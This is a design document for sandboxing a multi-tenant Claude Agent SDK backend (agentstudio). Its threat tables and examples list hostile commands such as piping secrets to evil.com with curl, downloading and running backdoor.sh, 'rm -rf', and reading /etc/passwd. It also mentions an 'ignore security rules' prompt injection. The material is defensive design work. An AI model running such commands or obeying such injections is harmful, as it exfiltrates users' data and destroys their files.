# Sandbox Security Architecture Design

> Date: 2026-03-26
> Status: Draft (extracted from SDK upgrade design Rev 5)
> Scope: agentstudio (backend + frontend)
> Origin: Split from `2026-03-25-claude-agent-sdk-upgrade-design.md` Phase 4
> Type: Independent security architecture project

---

## Background

This document was extracted from the SDK upgrade design document per review recommendation. Sandbox is a cross-cutting security architecture change that involves SDK configuration, storage model changes, API additions, settings UI, and deployment validation — too large to be a sub-phase of a general SDK upgrade.

**Dependency**: Phase 1.1 (thinking) and 1.5 (EffortLevel) from the SDK upgrade should be implemented first, as `buildQueryOptions` will be modified by both tracks.

---

## 1. Current Isolation Architecture (Problem)

**File**: `backend/src/routes/a2a.ts:733-812`

Current multi-tenant isolation has 3 layers, all "soft":

| Layer | Mechanism | Enforcement | Bypassable? |
|-------|-----------|-------------|-------------|
| cwdPath | `resolveUserWorkspacePath()` -> `.workspaces/u_{userId}` | SDK process default dir | Yes — `../` or absolute paths |
| System Prompt | 20-line `[Workspace Security Boundary]` block | LLM compliance | Yes — prompt injection |
| permissionMode | `acceptEdits` — auto-approve file operations | SDK permission layer | Yes — approves everything |

**Key vulnerability**: All 3 layers depend on Claude "choosing to comply". A prompt injection attack can instruct Claude to ignore the security boundary and access `../../other_user/private.txt` or `curl evil.com`.

---

## 2. Sandbox Architecture (Solution)

SDK `sandbox` option (`sdk.d.ts:1209`, type `SandboxSettings` at `sdk.d.ts:3538-3605`) provides **OS kernel-level** isolation via Linux seccomp / macOS sandbox profiles.

`sandbox` is a field on `Options`, passed to each `query()` call — fully dynamic, per-request controllable. [SDK Verified]

**Files**:
- `backend/src/utils/claudeUtils.ts` — Add sandbox config to `buildQueryOptions`
- `backend/src/routes/a2a.ts` — Conditional system prompt (20 lines / 3 lines)

```typescript
// claudeUtils.ts - buildQueryOptions(), after queryOptions construction:

// Sandbox: OS-level isolation for multi-tenant workspaces
// Only enable when cwdOverride is set (per-user workspace mode)
if (cwdOverride) {
  queryOptions.sandbox = {
    enabled: true,
    failIfUnavailable: true,       // Hard fail if sandbox can't start — never run unsandboxed
    allowUnsandboxedCommands: false, // Ignore dangerouslyDisableSandbox param
    autoAllowBashIfSandboxed: true,  // Bash is safe inside sandbox

    filesystem: {
      allowWrite: [cwdOverride],     // Only write to user's workspace
      denyWrite: [
        path.resolve(cwdOverride, '../../'),  // Block parent traversal
        '/etc', '/root', '/home',
      ],
      denyRead: [
        path.resolve(cwdOverride, '../../'),  // Can't read other users
      ],
      allowRead: [cwdOverride],      // Explicitly allow user's own dir
    },

    network: {
      allowedDomains: [
        'localhost',              // All local services (WeKnora, SearXNG, Firecrawl, Graphiti, ES, etc.)
        '127.0.0.1',
        'api.anthropic.com',     // Claude API
      ],
      allowManagedDomainsOnly: true,  // Ignore project-level domain configs
    },
  };
}
```

---

## 3. System Prompt — Conditional by Sandbox State

**Current** (`a2a.ts:744-764`): 20-line security boundary, ~200 tokens per request.

**Change**: Keep BOTH versions. Select based on sandbox state:

```typescript
// a2a.ts - conditional workspace prompt:
if (cwdPath !== projectRoot) {
  let workspacePrompt: string;

  if (sandboxEnabled) {
    // Sandbox ON -> short informational notice (3 lines, ~40 tokens)
    workspacePrompt = [
      '[Workspace] You are in an isolated user workspace.',
      'Files outside this directory are not accessible (OS-enforced).',
      'If access is denied, inform the user their workspace is isolated for security.',
    ].join('\n');
  } else {
    // Sandbox OFF -> full security boundary (existing 20 lines, ~200 tokens)
    // KEEP EXISTING CODE UNCHANGED — still needed for non-sandboxed users
    workspacePrompt = [
      '[Workspace Security Boundary — MANDATORY]',
      'You are operating inside a per-user isolated workspace. This is a SECURITY BOUNDARY.',
      // ... existing 20 lines preserved ...
      '[/Workspace Security Boundary]',
    ].join('\n');
  }

  systemPrompt = systemPrompt
    ? systemPrompt + '\n\n' + workspacePrompt
    : workspacePrompt;
}
```

**Why keep both**: Not all users have sandbox enabled. Users without sandbox still need the full prompt-based security boundary. Only sandboxed users get the short version (saving ~160 tokens/request).

---

## 4. What Sandbox Controls

| Threat | Without Sandbox | With Sandbox |
|--------|----------------|-------------|
| `cat ../../other_user/secret.txt` | Depends on prompt | Kernel EPERM |
| `curl https://evil.com -d @data` | No control | Kernel ECONNREFUSED |
| `cd / && rm -rf *` | Depends on prompt | Kernel EPERM on write |
| Prompt injection: "ignore security rules" | May comply | Irrelevant — kernel blocks |
| `pip install malicious-pkg` | No control | Network blocked |
| `wget backdoor.sh && bash backdoor.sh` | No control | Network blocked |
| Access via localhost MCP/SearXNG/Firecrawl | Works | Still works (localhost allowed) |

### 4.1 Tool-Level Restriction Details

Sandbox restricts the **SDK subprocess and its children** (Bash commands, file operations).

**Bash Tool** (most impacted):
```
Claude executes:  bash -c "cat /etc/passwd"
Sandbox intercepts:  open("/etc/passwd", O_RDONLY) -> EPERM
                     Claude sees: "Permission denied"

Claude executes:  bash -c "curl https://evil.com -d @secret.txt"
Sandbox intercepts:  connect(evil.com:443) -> ECONNREFUSED
                     Claude sees: "Connection refused"

Claude executes:  bash -c "ls ./my-files/"
Sandbox allows:   open("./my-files/", O_RDONLY) -> OK (within cwdPath)
```

**Read Tool**:
```
Claude reads:  /home/other_user/private.txt -> denyRead -> EPERM
Claude reads:  ./documents/report.txt -> allowRead cwdPath -> OK
```

**Edit/Write Tool**:
```
Claude edits:  ../../other_user/config.yaml -> denyWrite -> EPERM
Claude edits:  ./src/app.js -> allowWrite cwdPath -> OK
```

### 4.2 Whitelist Configuration Details

**Filesystem Whitelist** — "Additional" rules on top of SDK defaults: [SDK Verified]

| Rule | Paths | Purpose | Type |
|------|-------|---------|------|
| `allowWrite` | `[cwdPath]` | User's own workspace | Additive (SDK default + this) |
| `denyWrite` | `[cwdPath/../../, /etc, /root, /home]` | Block parent traversal + system dirs | Restrictive |
| `denyRead` | `[cwdPath/../../]` | Block reading other users' workspaces | Restrictive |
| `allowRead` | `[cwdPath]` | Re-allow user's own dir within any denyRead | Override (takes precedence over denyRead) |

**SDK Default Rules** (not configurable, always active): [Runtime Validation Required]
- `~/.claude/` — SDK session storage, config, hooks -> always R/W
- `cwd` (working directory) — always R/W
- `/tmp` — temporary files -> always R/W
- SDK binary path — always R/X

**Network Whitelist**:

| Domain | Purpose | Required? |
|--------|---------|-----------|
| `localhost` | All local services (WeKnora, SearXNG, Firecrawl, Graphiti, ES, PG, Redis) | Yes |
| `127.0.0.1` | Same as localhost (some tools use IP) | Yes |
| `api.anthropic.com` | Claude API calls | Yes |
| Custom domains | Per-project external APIs (e.g., GitHub API for code agents) | Optional, configurable |

**`allowManagedDomainsOnly: true`** means:
- Only domains in our `allowedDomains` list are respected
- Project-level `.claude/settings.json` domain configs are IGNORED
- This prevents users from adding arbitrary domains via project settings

---

## 5. Compatibility: Services via localhost

Sandbox only restricts the **Claude Agent subprocess**, not other services:

```
External Internet <-> SearXNG / Firecrawl / MCP Servers (no sandbox)
                          | localhost (allowed)
                    Claude Agent (sandboxed)
```

All existing integrations continue working:
- WeKnora API (localhost:8080)
- Graphiti (localhost:8000/8001)
- SearXNG (localhost:8888)
- Firecrawl (localhost:3002)
- Elasticsearch (localhost:9200)
- PostgreSQL (localhost:5432)

---

## 6. Platform Requirements

| Platform | Sandbox Backend | Status |
|----------|----------------|--------|
| Linux | seccomp + namespaces | Full support (production server) |
| macOS | sandbox-exec profiles | Supported (dev machines) |
| Windows | Not supported | `failIfUnavailable` will error — skip on Windows dev |

```typescript
// Windows guard (dev environment only):
if (cwdOverride && process.platform !== 'win32') {
  queryOptions.sandbox = { ... };
}
```

---

## 7. A2A Session Impact Analysis

> Critical clarification: Sandbox restricts the **Claude Code CLI subprocess** spawned by `query()`, NOT the Node.js backend process. Most A2A infrastructure runs in the backend and is completely unaffected. [Code Verified]

**Process boundary**:

```
Node.js Backend (port 4936) — NOT sandboxed
|- a2aHistoryService     -> writes .a2a/history/*.jsonl    unaffected
|- agentStorage          -> reads ~/.agentstudio/agents/   unaffected
|- sessionManager        -> session metadata in memory     unaffected
|- workspaceWatcher      -> chokidar on cwdPath            unaffected
|- AskUserQuestion       -> memory EventEmitter + SSE      unaffected
|
'- query({ sandbox }) --> Claude Code CLI subprocess       SANDBOXED
                           |- Bash tool execution          restricted
                           |- Read/Edit file operations    restricted
                           |- Network from tools           restricted
                           |- ~/.claude/projects/ (session) SDK default allows
                           |- ~/.claude/*.json (config)     SDK default allows
                           '- MCP stdio child processes     [Runtime Validation Required]
```

**Impact matrix**:

| Component | Runs In | Sandbox Impact | Confidence |
|-----------|---------|----------------|------------|
| Session history | Node.js backend | **None** | [Code Verified] |
| Session resume | SDK subprocess | **None** | [SDK Verified — "Additional" rules] |
| Session create/persist | SDK subprocess | **None** | [SDK Verified] |
| Agent config load | Node.js backend | **None** | [Code Verified] |
| AskUserQuestion MCP | In-process memory | **None** | [Code Verified] |
| Graphiti hooks | SDK subprocess -> HTTP | **None** | [SDK Verified — localhost allowed] |
| MCP stdio subprocesses | SDK child processes | **Verify** | [Runtime Validation Required] |
| Bash/Read/Edit tools | SDK subprocess | **Restricted (target)** | [SDK Verified] |

---

## 8. Project-Level and User-Level Sandbox Control

### Activation Logic

```
sandboxEnabled = projectSandbox.enabled || userSandbox[userId]?.enabled
```

| Project Setting | User Setting | Result | Scenario |
|----------------|-------------|--------|----------|
| **ON** | (any/unset) | Sandbox ON for ALL users | Full project isolation |
| OFF | **User A = ON** | Sandbox ON for User A only | Per-user isolation |
| OFF | (unset) | Sandbox OFF | No isolation |

**Design principle**: Project-level is a **global switch** (forces all users). User-level is an **independent per-user switch** (only affects that user, doesn't affect others).

### Data Model (based on code facts)

**Current storage architecture** (verified from source): [Code Verified]

```
~/.agentstudio/                           <- AGENTSTUDIO_HOME (paths.ts:39-42)
|- data/
|   '- projects.json                     <- ProjectMetadataStore (paths.ts:88)
|       { "/real/path": ProjectMetadata } <- key = resolved real path
|
'- project-users.json                    <- ProjectUserStore (projectUserStorage.ts:7)
    { "project-id": ProjectUserMapping }  <- key = projectId
```

**Current types** (from `types/projects.ts:17-39` and `types/users.ts:10-15`): [Code Verified]

```typescript
// types/projects.ts — ProjectMetadata (current, 12 fields):
interface ProjectMetadata {
  id: string;
  name: string;
  description?: string;
  path: string;
  createdAt: string;
  lastAccessed: string;
  agents: Record<string, ProjectAgentConfig>;
  defaultAgent: string;
  skills: Record<string, ProjectSkillConfig>;
  defaultProviderId?: string;
  defaultModel?: string;
  tags: string[];
  metadata: Record<string, any>;  // exists but unused for sandbox
}

// types/users.ts — ProjectUserMapping (current, 4 fields):
interface ProjectUserMapping {
  projectId: string;
  allowAllUsers: boolean;
  allowedUserIds: string[];
  updatedAt: string;
}
```

**Change — add independent typed fields** (backward compatible, optional fields):

```typescript
// types/projects.ts — ADD to ProjectMetadata:
interface ProjectMetadata {
  // ... existing 12 fields unchanged ...
  sandbox?: SandboxProjectConfig;  // NEW
}

// NEW type:
interface SandboxProjectConfig {
  enabled: boolean;                    // Global switch — ON = all users sandboxed
  allowedDomains?: string[];           // Extra domains beyond built-in defaults
  additionalWritePaths?: string[];     // Extra write paths beyond user cwdPath
  additionalDenyReadPaths?: string[];  // Extra deny rules
  failIfUnavailable?: boolean;         // Default: true
}

// types/users.ts — ADD to ProjectUserMapping:
interface ProjectUserMapping {
  projectId: string;
  allowAllUsers: boolean;
  allowedUserIds: string[];
  updatedAt: string;
  userSandboxConfig?: Record<string, UserSandboxConfig>;  // NEW — key = userId
}

// NEW type:
interface UserSandboxConfig {
  enabled: boolean;                    // Per-user switch
  allowedDomains?: string[];           // Extra domains for this user
}
```

**Why typed fields, not `metadata: Record<string, any>`**:
- Type-safe: IDE autocomplete, compile-time checks
- Both fields are `optional` (`?`) -> zero migration, existing JSON files load without error
- `ProjectMetadataStorage` uses `JSON.parse` -> new fields auto-persist on next `saveStore()`
- `ProjectUserStorage` same pattern -> `userSandboxConfig` auto-persist on next `saveStore()`

### Backend Implementation

**`buildQueryOptions` — sandbox resolution logic**:

```typescript
// 1. Read configs (projectPath and userId available from caller)
const projectSandbox = projectMetadataStorage.getProjectMetadata(projectPath)?.sandbox;
const userMapping = projectUserStorage.getProjectUsers(projectId);
const userSandbox = userMapping?.userSandboxConfig?.[userId];

// 2. OR logic: project forces all, or user opts in individually
const sandboxEnabled = (projectSandbox?.enabled === true) || (userSandbox?.enabled === true);

// 3. Merge whitelists: project + user (additive)
const extraDomains = [
  ...(projectSandbox?.allowedDomains || []),
  ...(userSandbox?.allowedDomains || []),
];

// 4. Apply sandbox if enabled and on supported platform
if (cwdOverride && sandboxEnabled && process.platform !== 'win32') {
  queryOptions.sandbox = {
    enabled: true,
    failIfUnavailable: projectSandbox?.failIfUnavailable ?? true,
    allowUnsandboxedCommands: false,
    autoAllowBashIfSandboxed: true,
    filesystem: {
      allowWrite: [cwdOverride, ...(projectSandbox?.additionalWritePaths || [])],
      denyWrite: [path.resolve(cwdOverride, '../../'), '/etc', '/root', '/home'],
      denyRead: [path.resolve(cwdOverride, '../../'), ...(projectSandbox?.additionalDenyReadPaths || [])],
      allowRead: [cwdOverride],
    },
    network: {
      allowedDomains: [
        'localhost', '127.0.0.1', 'api.anthropic.com', // built-in, cannot remove
        ...extraDomains,                                 // project + user extras
      ],
      allowManagedDomainsOnly: true,
    },
  };
}

// 5. Return sandboxEnabled to caller — needed for system prompt selection (Section 3)
//    a2a.ts uses this to choose full prompt (sandbox OFF) vs short prompt (sandbox ON)
```

**Note**: `sandboxEnabled` must be computed in `a2a.ts` (Option A — simpler, no signature change to buildQueryOptions) where `projectPath` and `userId` are already available.

### API Endpoints

```typescript
// Project-level sandbox config
GET  /projects/:path/sandbox              -> SandboxProjectConfig
PUT  /projects/:path/sandbox              -> save SandboxProjectConfig

// User-level sandbox config (per project)
GET  /projects/:path/sandbox/users        -> Record<userId, UserSandboxConfig>
PUT  /projects/:path/sandbox/users/:userId -> save UserSandboxConfig for one user
DELETE /projects/:path/sandbox/users/:userId -> remove user sandbox override
```

### Frontend UI — ProjectSettingsModal "Security" Tab

```
+- Project Settings -----------------------------------------------+
|  [General] [Model] [Security]                                    |
|                                                                  |
|  +- Project Sandbox -------------------------------------------+ |
|  |                                                             | |
|  |  [x] Enable Sandbox for all users                          | |
|  |    All users in this project will run in sandbox mode       | |
|  |                                                             | |
|  |  [x] Fail if sandbox unavailable                           | |
|  |                                                             | |
|  |  Network Whitelist                                          | |
|  |  +-------------------------------------------------------+ | |
|  |  | (locked) localhost          (built-in)                 | | |
|  |  | (locked) api.anthropic.com  (built-in)                 | | |
|  |  |          api.github.com     [x]                        | | |
|  |  | [+ Add domain]                                        | | |
|  |  +-------------------------------------------------------+ | |
|  |                                                             | |
|  |  Additional Write Paths                                     | |
|  |  +-------------------------------------------------------+ | |
|  |  | (User workspace always writable)                       | | |
|  |  | /shared/datasets   [x]                                 | | |
|  |  | [+ Add path]                                           | | |
|  |  +-------------------------------------------------------+ | |
|  +-------------------------------------------------------------+ |
|                                                                  |
|  +- Per-User Sandbox ------------------------------------------+ |
|  |                                                             | |
|  |  When project sandbox is OFF, you can enable sandbox        | |
|  |  for individual users:                                      | |
|  |                                                             | |
|  |  +---------------------+----------+----------------+       | |
|  |  | User                | Sandbox  | Extra Domains   |       | |
|  |  +---------------------+----------+----------------+       | |
|  |  | alice@example.com   | [x] ON   | api.github.com |       | |
|  |  | bob@example.com     | [ ] OFF  | --             |       | |
|  |  | charlie@example.com | [x] ON   | --             |       | |
|  |  +---------------------+----------+----------------+       | |
|  |                                                             | |
|  |  Note: When project sandbox is ON, all users are            | |
|  |  sandboxed regardless of individual settings.               | |
|  +-------------------------------------------------------------+ |
|                                                                  |
|                          [Cancel]  [Save]                        |
+------------------------------------------------------------------+
```

---

## 9. Risk Assessment

| Risk | Mitigation |
|------|-----------|
| `failIfUnavailable: true` blocks startup on unsupported platform | Platform check (`process.platform !== 'win32'`) |
| Too restrictive — blocks legitimate tool access | `allowedDomains` whitelist covers all localhost services |
| Sandbox dependencies missing on server | Test during deployment; SDK provides clear error messages |
| Performance overhead | Negligible — seccomp is kernel-level, near-zero overhead |
| SDK default rules assumption | [Runtime Validation Required] — verify ~/.claude/ access after enabling |
| MCP stdio subprocess inheritance | [Runtime Validation Required] — verify post-deployment |
| Windows dev false confidence | Cannot test sandbox on Windows; all sandbox verification must be on Linux/macOS |

**Risk**: Low for implementation. **High risk of NOT implementing** — current prompt-based isolation is vulnerable to prompt injection.

---

## Implementation Plan

### Execution Order

| Step | Content | Files | Effort |
|------|---------|-------|--------|
| 1 | Sandbox core — queryOptions injection | claudeUtils.ts | 20 min |
| 2 | Conditional system prompt | routes/a2a.ts | 15 min |
| 3 | Type definitions | types/projects.ts + types/users.ts | 10 min |
| 4 | Storage helper methods | projectMetadataStorage.ts + projectUserStorage.ts | 20 min |
| 5 | API endpoints | routes/projects.ts | 30 min |
| 6 | Frontend Security tab | ProjectSettingsModal.tsx | 1.5 hr |

### Files Changed

| Project | Files |
|---------|-------|
| agentstudio backend | `claudeUtils.ts`, `routes/a2a.ts`, `types/projects.ts`, `types/users.ts`, `projectMetadataStorage.ts`, `projectUserStorage.ts`, `routes/projects.ts` |
| agentstudio frontend | `ProjectSettingsModal.tsx` |
| weknora-ui | None |

### Verification Checklist

**Build/Type Checks**:
- [ ] `pnpm run type-check` passes (backend)
- [ ] `pnpm run type-check` passes (frontend)

**Functional Acceptance**:
- [ ] Sandbox: per-user workspace gets `sandbox.enabled: true` when cwdOverride is set
- [ ] Sandbox: project-level config GET/PUT API works
- [ ] Sandbox: user-level config GET/PUT/DELETE API works
- [ ] Sandbox: project ON -> all users sandboxed
- [ ] Sandbox: project OFF + user ON -> only that user sandboxed
- [ ] Sandbox: project OFF + user unset -> no sandbox
- [ ] Sandbox: system prompt 20 lines when OFF, 3 lines when ON
- [ ] Sandbox: custom allowedDomains merged into network rules
- [ ] Sandbox: Windows dev environment skips sandbox

**Security / Deployment Validation Gates** (must be on Linux production):
- [ ] `cat ../../` returns permission denied (kernel-level)
- [ ] `curl localhost:8080` works (local services allowed)
- [ ] `curl https://external.com` blocked (non-whitelisted domain)
- [ ] `failIfUnavailable: true` tested on Linux server
- [ ] Session resume works with sandbox enabled
- [ ] MCP stdio child processes inherit sandbox restrictions
- [ ] ProjectSettingsModal shows Security tab with project toggle + per-user table

---

## Review History

| Date | Reviewer | Dimension | Key Findings |
|------|----------|-----------|-------------|
| 2026-03-26 | Security Agent | Original design | Sandbox should be elevated priority; prompt-based isolation vulnerable |
| 2026-03-26 | Sandbox A2A Impact | Session chain | Node.js backend ops not sandboxed; SDK default rules allow ~/.claude/; MCP stdio needs verify |
| 2026-03-26 | Sandbox Control Design | Granularity | Project=global switch, user=individual switch, OR logic |
| 2026-03-26 | Sandbox Storage Design | Code-fact based | ProjectMetadata.sandbox typed field; ProjectUserMapping.userSandboxConfig |
| 2026-03-26 | Independent Review | Scope split | Sandbox should be separate project from SDK upgrade track |

---

## References

- SDK TypeScript Docs: https://platform.claude.com/docs/en/agent-sdk/typescript
- SDK Sandbox Settings: https://docs.anthropic.com/en/docs/claude-code/settings#sandbox-settings
- SDK Changelog: https://github.com/anthropics/claude-agent-sdk-typescript/blob/main/CHANGELOG.md
- Parent design: `2026-03-25-claude-agent-sdk-upgrade-design.md`
